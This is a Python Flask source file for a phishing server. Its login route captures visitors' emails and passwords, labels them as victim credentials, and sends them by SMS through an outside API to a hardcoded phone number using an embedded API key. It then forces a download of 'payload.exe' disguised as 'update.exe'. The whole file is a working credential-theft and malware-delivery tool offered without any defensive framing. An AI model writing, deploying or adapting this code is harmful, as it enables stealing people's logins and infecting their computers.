from flask import Flask, request, render_template, send_file
import os
import smtplib
from email.mime.text import MIMEText
import requests # For SMS API
import base64

app = Flask(__name__)

# CONFIGURATION
TARGET_PHONE = "+233545274761"
SMS_API_KEY = "tlv_frF1Im4yaSmzfdxTaejLQxzgVF04vkjJC3CiE5VyzEk"  # Replace with Twilio or similar API Key
MALWARE_PATH = "payload.exe"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    message = f"Victim Credentials Captured:\nEmail: {email}\nPassword: {password}"
    
    # Send SMS via API (Example using a generic POST request)
    try:
        # Replace this URL with your actual SMS provider endpoint
        payload = {
            "to": TARGET_PHONE,
            "message": message,
            "api_key": SMS_API_KEY
        }
        requests.post("https://api.ng.termii.com/api/sms/send", json=payload)
    except Exception as e:
        print(f"SMS Error: {e}")

    # Force download malware after successful "login"
    return send_file(MALWARE_PATH, as_attachment=True, download_name='update.exe')

if __name__ == '__main__':
    app.run(debug=False, port=5000, host='0.0.0.0')
    
